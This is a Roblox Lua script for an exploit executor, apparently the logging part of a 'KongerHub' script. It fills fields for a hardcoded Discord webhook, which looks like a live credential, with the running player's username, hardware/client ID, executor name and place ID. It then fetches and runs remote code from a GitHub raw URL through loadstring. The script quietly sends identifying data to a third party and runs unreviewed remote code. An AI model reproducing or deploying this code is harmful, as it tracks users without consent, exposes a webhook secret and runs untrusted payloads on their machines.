-- // WebHook URL
WebHook = "https://discord.com/api/webhooks/1252715940500471848/VhoOCpz9XvwHuV2CPof5YdomKZsd74GbcC1TTV2XY3z87DbDUjJhx_cMATJFYq0JV8r3"
-- // Modify your WebHook field
Content = ""
  Title = "Info"
    FieldName = "Username: "..game.Players.LocalPlayer.Name..""
       Field1 = ""
       Field2 = ""
       Field3 = ""
       Field4 = ""
       Field5 = ""
       Field6 = ""
       Field7 = ""
       Field8 = ""
       Field9 = ""
       Field10 = ""
    FieldName1 = "Hardware ID: "..game:GetService("RbxAnalyticsService"):GetClientId()..""
       Field11 = ""
       Field12 = ""
       Field13 = ""
       Field14 = ""
       Field15 = ""
       Field16 = ""
       Field17 = ""
       Field18 = ""
       Field19 = ""
       Field20 = ""
    FieldName2 = "Executor: "..identifyexecutor()..""
       Field21 = ""
       Field22 = ""
       Field23 = ""
       Field24 = ""
       Field25 = ""
       Field26 = ""
       Field27 = ""
       Field28 = ""
       Field29 = ""
       Field30 = ""
    FieldName3 = "Place Id: "..game.PlaceId..""
       Field31 = ""
       Field32 = ""
       Field33 = ""
       Field34 = ""
       Field35 = ""
       Field36 = ""
       Field37 = ""
       Field38 = ""
       Field39 = ""
       Field40 = ""
-- // WebHook's avatar [ Change it to "" if you want to change it, and nil to deafult ]
       Username = nil
       Avatar = nil
-- // Modify your WebHook's looks & feel
       Color = nil
       Footer = "KongerHub Script was ran by "..game.Players.LocalPlayer.Name.."."
       TimeStamp = ""
       FooterIconURL = "https://static-00.iconduck.com/assets.00/eyes-emoji-2048x1604-shl6hyra.png"
       ThumbnailURL = ""
       ImageURL = ""
-- // Extras
       ThreadName = nil -- Creates a Thread, use this only if the channel is "Forum", also change it from nil to ""
       -- // 4 = Content Only
       -- // nil = Content + Embeds
       Flags = nil

loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/2.0.lua", true))()
